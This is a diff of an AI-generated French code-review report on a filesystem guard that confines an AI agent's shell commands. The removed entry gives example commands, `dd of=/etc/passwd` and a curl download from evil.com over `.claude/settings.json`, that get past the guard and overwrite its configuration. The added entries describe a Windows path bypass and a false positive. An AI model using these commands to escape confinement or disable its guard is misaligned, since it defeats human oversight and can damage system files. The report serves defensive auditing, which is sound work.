@@ -4,11 +4,17 @@
   {
    "severite": "critique",
    "fichier": "src/forgeai/ide/guard_fs.py",
-   "description": "Les chemins attachés à des options de commande (sans espace ou via `=`) contournent le confinement et l'auto-protection. Le découpage par `DELIMITEURS` ne sépare pas les caractères comme `=` ou les préfixes d'options courtes (ex: `-o`). Par conséquent, un fragment comme `of=/etc/passwd` ou `-o.claude/settings.json` est extrait tel quel. La fonction `os.path.isabs` retourne `False` pour ces fragments, les faisant passer pour des chemins relatifs inoffensifs (ex: `<cwd>/of=/etc/passwd`), qui sont autorisés car le cwd est dans la racine. Cependant, l'outil sous-jacent (comme `dd`, `curl`, `tar`) interprétera l'option et accèdera au chemin absolu ou protégé réel.",
-   "preuve": "Une commande Bash `dd of=/etc/passwd` produit le fragment `of=/etc/passwd`. `os.path.isabs(\"of=/etc/passwd\")` est `False`, donc résolu en `<cwd>/of=/etc/passwd` (autorisé car sous ROOT). `dd` écrira pourtant dans `/etc/passwd`. De même, `curl -o.claude/settings.json http://evil.com` produit le fragment `-o.claude/settings.json`, résolu en `<cwd>/-o.claude/settings.json` (qui n'est pas sous `.claude`), contournant l'auto-protection et écrasant la configuration de la garde."
+   "description": "Contournement (bypass) sur Windows : la regex OUVRE_CHEMIN ignore les chemins Windows agglutinés à une option. Un fragment comme `-fC:\\Windows\\System32` ou `-f\\Windows` ne matche pas `[/~.]`. Le suffixe n'est donc pas extrait. Le fragment entier `-fC:\\Windows\\System32` est évalué, mais comme il commence par `-`, `os.path.isabs` le considère relatif. Il se résout donc DANS la racine et est autorisé à tort, permettant l'accès hors racine (critère de rejet 'a').",
+   "preuve": "Ligne 231 : `OUVRE_CHEMIN = re.compile(r\"[/~.]\")` ne contient ni `\\\\` ni `[A-Za-z]:`. L'extraction `m = OUVRE_CHEMIN.search(fragment)` échoue sur `-fC:\\Windows`."
+  },
+  {
+   "severite": "majeure",
+   "fichier": "src/forgeai/ide/guard_fs.py",
+   "description": "Faux positif bloquant sur POSIX pour les chemins relatifs agglutinés contenant un slash. Si une commande utilise `gcc -Iinclude/sys` ou `tar -fout/archive.tar`, `OUVRE_CHEMIN.search` trouve le premier slash et extrait le suffixe `/sys` ou `/archive.tar`. Ce suffixe tronqué devient un chemin absolu hors racine, ce qui provoque un REFUS (exit 2) pour un chemin relatif légitime situé dans la racine.",
+   "preuve": "Lignes 234-236 : `m = OUVRE_CHEMIN.search(fragment)` sur `-Iinclude/sys` matche le `/` à l'index 8. `suffixe = fragment[m.start():]` donne `/sys`, qui est absolu et sera rejeté."
   }
  ],
- "date_heure": "2026-07-29T22:44:21.548152+00:00",
- "prompt_sha256": "af892163dfa551aa2aa86d59a26f657e243ec63528b9d3875a9780b4b1fd09ce",
+ "date_heure": "2026-07-29T23:00:12.308702+00:00",
+ "prompt_sha256": "4a93505d7db8d2430d1a3bf3b524fe4cb50203de2e29a0d96d123f77572d34b9",
  "reviewer_model": "Gemini-3.1-Pro-OR"
 }
